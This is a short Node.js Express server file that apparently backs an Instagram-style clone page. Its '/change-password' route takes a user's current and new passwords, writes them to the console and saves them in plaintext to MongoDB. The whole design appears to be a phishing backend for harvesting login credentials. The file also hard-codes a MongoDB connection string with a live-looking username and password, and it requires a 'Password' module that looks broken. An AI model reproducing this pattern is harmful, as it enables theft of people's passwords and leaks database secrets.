const express = require('express');
const mongoose = require('mongoose');
const dotenv = require('dotenv');
const path = require('path');
const Password = require('Password');

dotenv.config();
const app = express();

app.use(express.json());

// Serve static files from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Remove EJS view engine usage since we serve static files
// app.set('view engine', 'ejs');

mongoose.connect(`mongodb+srv://instaclone:clone69@cluster0.fq7ujpu.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`)
  .then(() => console.log("MongoDB connected"))
  .catch(err => console.log("MongoDB connection error:", err));

// Serve index.html on root route
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/change-password', async (req, res) => {
  const { currentPassword, newPassword } = req.body;

  console.log("Received:", req.body);

  try {
    await Password.create({ currentPassword, newPassword });
    res.json({ message: "Password saved successfully" }); // Send success response
  } catch (err) {
    console.error("DB Insert Error:", err);
    res.status(500).json({ error: "Insert failed" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on http://localhost:${PORT}`));
